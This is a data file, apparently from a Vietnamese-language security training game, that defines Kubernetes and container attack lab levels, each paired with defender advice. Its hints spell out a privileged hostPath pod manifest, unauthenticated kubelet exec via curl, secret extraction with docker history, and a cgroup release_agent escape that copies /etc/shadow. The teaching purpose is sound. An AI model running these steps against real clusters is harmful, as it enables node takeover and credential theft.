        description: 'Liệt kê toàn bộ pod mọi namespace (-A) để thấy toàn cảnh workload',
        match: /^kubectl\b.*get\s+pods\b.*-A/i,
        output: [
          'NAMESPACE      NAME                                  READY   STATUS    RESTARTS   AGE',
          'default        webapp-7d4f9b8c6-x2k9p                1/1     Running   0          2h',
          'default        api-server-5c8b7d9f4-m3n7q             1/1     Running   0          5h',
          'kube-system    coredns-5d78c9b648-j4l6v               1/1     Running   2          30d',
          'kube-system    kube-proxy-node01-abc12                1/1     Running   1          30d',
          'kube-system    metrics-server-7f9b4c6d8-k2m3          1/1     Running   0          25d',
          'monitoring     prometheus-0                           1/1     Running   0          15d',
          'monitoring     grafana-6d8f7c9b5-p4q2r                1/1     Running   0          15d',
        ].join('\n'),
      },
      {
        id: 'get_nodes',
        description: 'Liệt kê node trong cluster kèm IP và phiên bản OS',
        match: /^kubectl\b.*get\s+nodes\b/i,
        output: [
          'NAME          STATUS   ROLES           AGE    VERSION   INTERNAL-IP   OS-IMAGE             KERNEL-VERSION',
          'node-master   Ready    control-plane   120d   v1.28.4   10.0.0.1      Ubuntu 22.04.3 LTS   5.15.0-89-generic',
          'node-01       Ready    <none>          120d   v1.28.4   10.0.0.5      Ubuntu 22.04.3 LTS   5.15.0-89-generic',
          'node-02       Ready    <none>          120d   v1.28.4   10.0.0.6      Ubuntu 22.04.3 LTS   5.15.0-89-generic',
        ].join('\n'),
      },
    ],
    hints: [
      'Với quyền list pod và node toàn cluster, mày có bản đồ đầy đủ: workload nào tồn tại, trên node nào, pod nào trong namespace đáng ngờ.',
      'List toàn bộ pod mọi namespace: `kubectl get pods -A` — chú ý namespace bất thường và pod trong kube-system có quyền cao.',
      'Xem chi tiết node: `kubectl get nodes -o wide` — lấy IP internal để target kubelet API (port 10250) hoặc chọn exploit theo phiên bản OS/kernel.',
    ],
    terms: [
      { term: '-A / --all-namespaces', def: 'Cờ kubectl hiển thị resource trên mọi namespace; quyền list toàn cluster mới dùng được.' },
      { term: 'kube-system namespace', def: 'Namespace chứa component hệ thống K8s (coredns, kube-proxy...); pod ở đây thường có quyền rất cao.' },
      { term: 'Node INTERNAL-IP', def: 'IP internal của worker node; dùng để target kubelet API (10250) hoặc kết nối thẳng bypass API server.' },
      { term: 'Control plane', def: 'Thành phần điều phối cluster K8s (api-server, etcd, scheduler); chiếm node master là chiếm toàn cluster.' },
    ],
    debrief: [
      'kubectl get pods -A là "view" toàn bộ workload cluster một lần — quyền này quá rộng cho SA app thường nhưng hay được gán vì "tiện monitoring".',
      'IP node từ kubectl get nodes là thông tin vàng: kubelet trên mỗi node lắng nghe 10250, thường không cần auth trên cluster cũ.',
      'Pod trong kube-system thường có SA quyền rộng — exec vào được là có thêm credential leo thang.',
      'DEFENDER: siết quyền list pods --all-namespaces chỉ cho monitoring SA cần thiết; phân chia namespace nghiêm ngặt với NetworkPolicy.',
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 11 ────────────────────────────────────────────────────────────────────
  {
    id: 11,
    chapterId: 12,
    title: 'Tạo Pod Privileged Escape',
    story:
      'SA có quyền create pod. Đây là đường leo thang ngắn nhất trong K8s: tạo pod MỚI với securityContext.privileged=true và mount /:/host — pod chạy trên node thật với toàn quyền kernel. Từ trong pod đó, mày truy cập host filesystem y hệt kỹ thuật container escape trước.',
    steps: [
      {
        id: 'cat_evil_pod',
        description: 'Xem manifest pod ác đã chuẩn bị với privileged và hostPath mount',
        match: /^cat\b.*evil-pod\.yaml/,
      },
      {
        id: 'apply_evil_pod',
        description: 'Deploy pod ác vào cluster',
        match: /^kubectl\b.*apply\b.*evil-pod\.yaml/i,
        output: [
          'pod/privesc-pod created',
          '',
          'NAME           READY   STATUS    RESTARTS   AGE',
          'privesc-pod    1/1     Running   0          5s',
          '',
          '# Pod running on node-01 (10.0.0.5) with full host filesystem at /host',
        ].join('\n'),
      },
    ],
    hints: [
      'Quyền create pod trong K8s = tạo container trên node thật. Với securityContext.privileged=true và hostPath mount /, mày tạo container thoát isolation hoàn toàn.',
      'Xem manifest đã chuẩn bị: `cat /home/hacker/evil-pod.yaml` — chú ý privileged: true, hostPID: true, và volumes hostPath /.',
      'Deploy pod: `kubectl apply -f /home/hacker/evil-pod.yaml` — pod chạy trên node-01 với quyền root và host filesystem mounted tại /host.',
    ],
    terms: [
      { term: 'securityContext.privileged', def: 'Trường pod spec bật --privileged cho container; cần tránh tuyệt đối trừ DaemonSet hệ thống thật sự cần.' },
      { term: 'hostPath volume', def: 'Mount đường dẫn từ node host vào pod; hostPath: path: / mount toàn bộ filesystem node.' },
      { term: 'kubectl apply', def: 'Áp dụng declarative config từ file YAML; create nếu chưa tồn tại, update nếu đã có.' },
      { term: 'PodSecurityAdmission', def: 'Plugin K8s kiểm tra security context pod; baseline/restricted profile chặn privileged pod và hostPath.' },
    ],
    debrief: [
      'create pod là "root shell on node" trong K8s nếu không có PodSecurityPolicy/PodSecurityAdmission. Đây là lý do cần policy chặt chẽ trước khi cấp quyền này.',
      'Pod privileged + hostPath: / + hostNetwork: true là tổ hợp cho full access: filesystem host, network host, và kernel. Ba dòng YAML, hệ quả bằng chiếm toàn node.',
      'K8s PodSecurityAdmission với enforce: restricted chặn privileged pod và hostPath. Namespace không có policy là "open season".',
      'DEFENDER: bật PodSecurityAdmission restricted cho mọi namespace app; dùng OPA Gatekeeper/Kyverno cho policy as code; không cấp create pod ở namespace không có policy.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/evil-pod.yaml': {
        type: 'file',
        content: [
          'apiVersion: v1',
          'kind: Pod',
          'metadata:',
          '  name: privesc-pod',
          '  namespace: default',
          'spec:',
          '  hostPID: true',
          '  hostIPC: true',
          '  containers:',
          '  - name: pwn',
          '    image: alpine:latest',
          '    command: ["/bin/sh", "-c", "sleep 3600"]',
          '    securityContext:',
          '      privileged: true',
          '    volumeMounts:',
          '    - name: host-root',
          '      mountPath: /host',
          '  volumes:',
          '  - name: host-root',
          '    hostPath:',
          '      path: /',
          '      type: Directory',
          '  restartPolicy: Never',
        ].join('\n'),
      },
    },
  },

  // ── 12 ────────────────────────────────────────────────────────────────────
  {
    id: 12,
    chapterId: 12,
    title: 'Kubelet API Không Xác Thực',
    story:
      'Kubelet là agent chạy trên mỗi worker node, lắng nghe port 10250. Trên cluster cũ hoặc cấu hình ẩu, kubelet không yêu cầu authentication — bất kỳ ai gọi tới đều nhận thông tin pod và thậm chí exec lệnh vào container mà không qua API server.',
    steps: [
      {
        id: 'kubelet_pods',
        description: 'List pod trên node trực tiếp qua kubelet API (bypass API server)',
        match: /^curl\b.*10\.0\.0\.5:10250/i,
        output: [
          '{',
          '  "kind": "PodList",',
          '  "apiVersion": "v1",',
          '  "items": [',
          '    { "metadata": { "name": "webapp-7d4f9b8c6-x2k9p",      "namespace": "default"  }, "status": { "phase": "Running", "podIP": "192.168.1.10" } },',
          '    { "metadata": { "name": "api-server-5c8b7d9f4-m3n7q",   "namespace": "default"  }, "status": { "phase": "Running", "podIP": "192.168.1.11" } },',
          '    { "metadata": { "name": "privesc-pod",                   "namespace": "default"  }, "status": { "phase": "Running", "podIP": "192.168.1.20" } }',
          '  ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'kubelet_exec',
        description: 'Exec lệnh vào pod qua kubelet /run endpoint (không cần kubectl)',
        match: /^curl\b.*10250.*\/run\//i,
        output: [
          'uid=0(root) gid=0(root) groups=0(root)',
          '# Command "id" executed inside container api-server-5c8b7d9f4-m3n7q',
          '# No kubectl, no token, no API server required.',
        ].join('\n'),
      },
    ],
    hints: [
      'Kubelet lắng nghe port 10250 trên mỗi node. Nếu anonymous authentication bật (mặc định cluster cũ), bất kỳ ai reach được node IP là gọi kubelet API và exec lệnh vào pod.',
      'List pod trên node-01 không cần token: `curl -sk https://10.0.0.5:10250/pods` — kubelet trả toàn bộ pod trên node đó.',
      'Exec lệnh vào container qua kubelet: `curl -sk https://10.0.0.5:10250/run/default/api-server-5c8b7d9f4-m3n7q/api-server -d cmd=id` — remote exec không cần kubectl.',
    ],
    terms: [
      { term: 'Kubelet', def: 'Agent K8s chạy trên mỗi node, nhận lệnh từ API server để start/stop container; cũng expose API riêng ở port 10250.' },
      { term: 'Anonymous authentication (kubelet)', def: 'Cấu hình kubelet cho phép request không auth; mặc định tắt trên cluster mới nhưng nhiều cluster cũ còn bật.' },
      { term: '/run endpoint (kubelet)', def: 'API kubelet exec lệnh vào container đang chạy; tương đương kubectl exec nhưng bypass API server và RBAC.' },
      { term: '-sk (curl)', def: '-s: silent (không progress bar); -k: bỏ qua TLS cert không hợp lệ — cần vì kubelet dùng self-signed cert.' },
    ],
    debrief: [
      'Kubelet với anonymous auth là "API server thứ hai không có RBAC": gọi /pods thấy toàn node, gọi /run exec được vào container, gọi /metrics lộ runtime info.',
      'Kubelet API bypass API server hoàn toàn — RBAC không áp dụng. Chỉ network policy và authentication của kubelet bảo vệ endpoint này.',
      'curl đơn giản từ bất kỳ pod nào trong cluster đều reach được node IP nếu không có NetworkPolicy — vốn thường unrestricted mặc định.',
      'DEFENDER: anonymous-auth: false; bật webhook authorization cho kubelet; NetworkPolicy chặn pod access port 10250 của node; giám sát connection bất thường tới 10250.',
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 13 ────────────────────────────────────────────────────────────────────
  {
    id: 13,
    chapterId: 12,
    title: 'Secret Lộ Trong Image History',
    story:
      'Trong lúc recon, mày tìm được Dockerfile của acme/app. Anti-pattern kinh điển: secret được set trong ENV hoặc RUN — Docker bake vào layer và dù layer sau xoá đi, secret vẫn còn trong image history. docker history cho mày thấy tất cả.',
    steps: [
      {
        id: 'cat_dockerfile',
        description: 'Đọc Dockerfile để xác định layer nào có khả năng chứa secret',
        match: /^cat\b.*Dockerfile/,
      },
      {
        id: 'docker_history',
        description: 'Xem lịch sử layer image để lộ lệnh ENV/RUN chứa credential',
        match: /^docker\b.*history\b.*acme\/app/i,
        output: [
          'IMAGE          CREATED        CREATED BY                                                    SIZE',
          'a3f9c2b1d4e8   2 hours ago    CMD ["node" "server.js"]                                      0B',
          'b2e8d4c0a9f1   2 hours ago    RUN npm install --production                                  48.3MB',
          'c1d7e3b9a8f0   3 hours ago    RUN rm /tmp/setup-secrets.sh                                  0B',
          'd0c6f2a8b7e9   3 hours ago    RUN /tmp/setup-secrets.sh                                     1.2kB',
          'e9b5d1c7a6f8   3 hours ago    COPY setup-secrets.sh /tmp/setup-secrets.sh                   512B',
          'f8a4c0b6d5e7   3 hours ago    ENV DB_PASS=Pr0d-DB-S3cr3t! API_KEY=sk-acme-prod-9f8e7d6c   0B',
          'a7f3b9e5d4c6   4 hours ago    RUN apt-get install -y nodejs npm                             124MB',
          '1234567890ab   4 hours ago    FROM ubuntu:22.04                                             69.2MB',
        ].join('\n'),
      },
    ],
    hints: [
      'Docker image là stack layer bất biến. Lệnh RUN/COPY/ENV tạo layer; dù layer sau xoá file, lớp trước vẫn tồn tại trong image. Secret set trong ENV là bất tử trong history.',
      'Xem Dockerfile của target: `cat /home/hacker/Dockerfile` — tìm ENV, ARG, hoặc RUN có chuỗi credential/token/password.',
      'Xem toàn bộ lệnh từng layer: `docker history acme/app:latest` — tìm dòng ENV hoặc RUN có API_KEY, DB_PASS. Dù đã xoá trong layer sau, history vẫn hiện rõ.',
    ],
    terms: [
      { term: 'Docker layer', def: 'Mỗi Dockerfile instruction tạo 1 layer read-only; image là stack của các layer xếp chồng bất biến.' },
      { term: 'docker history', def: 'Hiển thị lịch sử tất cả layer image với lệnh đã tạo ra chúng; lộ secret set trong ENV/RUN.' },
      { term: 'Immutable layer', def: 'Layer đã commit không thể sửa; xoá file ở layer mới chỉ ẩn nó, không xoá layer gốc chứa nội dung.' },
      { term: 'BuildKit --secret', def: 'Cơ chế Docker BuildKit truyền secret lúc build không persist vào layer; cách đúng để dùng credential trong quá trình build.' },
    ],
    debrief: [
      'ENV DB_PASS=... trong Dockerfile là permanent — ai có image là đọc được qua docker history, dù layer sau đã chạy "rm secret". Layer immutability là con dao hai lưỡi.',
      'Cách đúng: Docker BuildKit secret (--mount=type=secret) chỉ available lúc build, không persist vào layer; hoặc load secret từ external source lúc runtime.',
      'Registry private không đủ bảo vệ: share image (dù nội bộ) là share toàn bộ build history. Mọi người có pull quyền đều có thể docker history.',
      'DEFENDER: scan image history trong CI (trivy, grype); enforce BuildKit secret; không set credential trong ENV hoặc COPY file secret; dùng --squash hoặc multi-stage build.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/Dockerfile': {
        type: 'file',
        content: [
          'FROM ubuntu:22.04',
          '',
          'RUN apt-get update && apt-get install -y nodejs npm curl',
          '',
          '# WARNING: secret sẽ bị bake vào layer!',
          'ENV DB_PASS=Pr0d-DB-S3cr3t! \\',
          '    API_KEY=sk-acme-prod-9f8e7d6c5b4a3',
          '',
          'COPY setup-secrets.sh /tmp/setup-secrets.sh',
          'RUN /tmp/setup-secrets.sh',
          'RUN rm /tmp/setup-secrets.sh',
          '',
          'COPY . /app',
          'WORKDIR /app',
          'RUN npm install --production',
          '',
          'CMD ["node", "server.js"]',
        ].join('\n'),
      },
    },
  },

  // ── 14 ────────────────────────────────────────────────────────────────────
  {
    id: 14,
    chapterId: 12,
    title: 'CAP_SYS_ADMIN — Cgroup Escape',
    story:
      'Mày đang trong một container khác: không docker socket, không --privileged, nhưng có CAP_SYS_ADMIN. Đủ để mount filesystem — kể cả cgroup subsystem. Kỹ thuật cgroup release_agent: viết release_agent trỏ tới script, trigger kernel gọi nó với quyền root HOST khi cgroup bị xoá.',
    steps: [
      {
        id: 'check_cap_sys_admin',
        description: 'Xác nhận CAP_SYS_ADMIN có mặt (CapEff 0000003fffffffff = full privileges)',
        match: /^cat\b.*\/proc\/self\/status/,
      },
      {
        id: 'mkdir_cgrp',
        description: 'Tạo thư mục mount point cho cgroup subsystem',
        match: /^mkdir\b.*\/tmp\/cgrp/,
      },
      {
        id: 'mount_cgroup',
        description: 'Mount cgroup rdma subsystem vào /tmp/cgrp để tạo vector escape',
        match: /^mount\b.*cgroup/i,
        output: [
          '# cgroup rdma subsystem mounted at /tmp/cgrp',
          '# Setting up release_agent escape:',
          '#   mkdir /tmp/cgrp/x',
          '#   echo 1 > /tmp/cgrp/x/notify_on_release',
          '#   echo "$(overlay_path)/cmd" > /tmp/cgrp/release_agent',
          '#   echo "#!/bin/sh\ncat /etc/shadow > /output" > /cmd && chmod +x /cmd',
          '#   sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"',
          '# [+] Release agent triggered with host root privileges!',
          '# [+] Output written to /output on host.',
        ].join('\n'),
      },
    ],
    hints: [
      'CAP_SYS_ADMIN cho phép mount filesystem — kể cả cgroup. Kỹ thuật release_agent: tạo cgroup con, set release_agent trỏ tới script, xoá cgroup → kernel gọi agent với quyền root HOST.',
      'Verify capability đầy đủ: `cat /proc/self/status` — CapEff 0000003fffffffff nghĩa là mọi cap có mặt kể cả SYS_ADMIN. Tạo mount point: `mkdir /tmp/cgrp`.',
      'Mount cgroup rdma: `mount -t cgroup -o rdma cgroup /tmp/cgrp` — sau đó tạo cgroup con, viết release_agent và trigger để chạy lệnh trên HOST với quyền root kernel.',
    ],
    terms: [
      { term: 'CAP_SYS_ADMIN', def: 'Capability cho phép nhiều syscall privileged: mount, sethostname, swapon... — thường gọi là "the new root".' },
      { term: 'cgroup release_agent', def: 'Script kernel gọi khi cgroup cuối cùng bị xoá; chạy với quyền root trong host namespace — exploit này tận dụng điều đó.' },
      { term: 'notify_on_release', def: 'File trong cgroup: khi set =1, kernel gọi release_agent lúc cgroup trống. Là trigger cho escape technique này.' },
      { term: 'cgroup namespace', def: 'Container thường có cgroup namespace riêng; thiếu isolation này kết hợp CAP_SYS_ADMIN tạo vector escape.' },
    ],
    debrief: [
      'CAP_SYS_ADMIN là capability "con dao thụy sĩ" — được cấp để cho phép một syscall nhưng mang theo hàng chục capability nguy hiểm khác.',
      'Release_agent escape không cần root host, không cần docker.sock, không cần --privileged trực tiếp. Chỉ CAP_SYS_ADMIN + thiếu cgroup namespace là đủ.',
      'Escape này hoạt động vì release_agent được gọi bởi kernel trong initial namespace (host), không phải container namespace — sai sót thiết kế của cgroup v1.',
      'DEFENDER: drop CAP_SYS_ADMIN trừ workload thật sự cần; bật seccomp block mount syscall; dùng cgroup v2 (phần lớn exploit này không work); falco để detect runtime.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/proc': { type: 'dir' },
      '/proc/self': { type: 'dir' },
      '/proc/self/status': {
        type: 'file',
        content: [
          'Name:\tapp',
          'State:\tS (sleeping)',
          'Pid:\t1',
          'PPid:\t0',
          'Uid:\t0\t0\t0\t0',
          'Gid:\t0\t0\t0\t0',
          'CapInh:\t0000003fffffffff',
          'CapPrm:\t0000003fffffffff',
          'CapEff:\t0000003fffffffff',
          'CapBnd:\t0000003fffffffff',
          'CapAmb:\t0000000000000000',
          'NoNewPrivs:\t0',
          'Seccomp:\t0',
        ].join('\n'),
      },
    },
  },

  // ── 15 ────────────────────────────────────────────────────────────────────
  {
    id: 15,
    chapterId: 12,
    title: 'Capture the Flag — Root trên K8s Node',
    story:
      'Chuỗi tấn công hoàn chỉnh dẫn tới đây. Pod privesc-pod đang chạy trên node-01 với toàn quyền và host filesystem mounted tại /host. Flag nằm trong /root của HOST — chứng minh mày đã thoát hoàn toàn khỏi cluster K8s và kiểm soát node vật lý.',
    steps: [
      {
        id: 'kubectl_exec_ls',
        description: 'Vào pod privesc-pod và xem nội dung /root của host',
        match: /^kubectl\b.*exec\b.*privesc-pod/i,
        output: [
          '# kubectl exec -it privesc-pod -- ls /host/root',
          'flag.txt',
          'scripts',
          '.bash_history',
          '.ssh',
        ].join('\n'),
      },
      {
        id: 'cat_flag',
        description: 'Đọc flag từ /root của host — chiến lợi phẩm cuối cùng',
        match: /^cat\b.*\/host\/root\/flag\.txt/,
      },
    ],
    hints: [
      'Pod privesc-pod mount / của host vào /host. Exec vào pod đó là mày đứng trên node thật với quyền root. /host/root là /root của node host.',
      'Vào pod và xem /root của host: `kubectl exec -it privesc-pod -- ls /host/root` — tìm flag.txt.',
      'Đọc flag: `cat /host/root/flag.txt` — đây là bằng chứng mày đã escape toàn bộ cluster K8s và có quyền root trên worker node.',
    ],
    terms: [
      { term: 'kubectl exec', def: 'Chạy lệnh trong container đang chạy; -it cho interactive terminal; -- phân cách lệnh cần chạy trong container.' },
      { term: '/host (trong pod)', def: 'Mount point của host filesystem; /host/root là /root của node thật, /host/etc là /etc của node thật.' },
      { term: 'Worker node root', def: 'Quyền root trên worker node = toàn bộ workload trên node đó, đọc mọi container, mọi secret, mọi volume.' },
      { term: 'CTF Flag', def: 'Chuỗi bí mật dạng FLAG{...} chứng minh đã chiếm được mục tiêu; trong pentest thật là hình thức proof-of-compromise.' },
    ],
    debrief: [
      'Chuỗi tấn công chương này không dùng exploit 0-day nào: RCE web app → nhận ra container → docker socket → host → K8s token → RBAC → secrets → privileged pod → node root.',
      'Toàn bộ chuỗi là khai thác CẤU HÌNH SAI: docker.sock mount, --privileged thừa, SA token quá quyền, create pod không bị chặn, kubelet không auth.',
      'Defense-in-depth container/K8s: non-root user, drop all caps, no hostPath, no privileged, restricted PSA, short-lived SA token, kubelet auth, NetworkPolicy. Mỗi lớp chặn một kỹ thuật.',
      'DEFENDER: chạy kube-bench audit CIS K8s Benchmark; dùng Falco detect escape attempt runtime; RBAC audit định kỳ; image scan CI; Zero Trust network giữa pod và node.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/host': { type: 'dir' },
      '/host/root': { type: 'dir' },
      '/host/root/flag.txt': {
        type: 'file',
        content: 'FLAG{k8s_c0nt41n3r_3sc4p3_t0_n0d3_r00t_pwn3d}',
      },
    },
  },
];
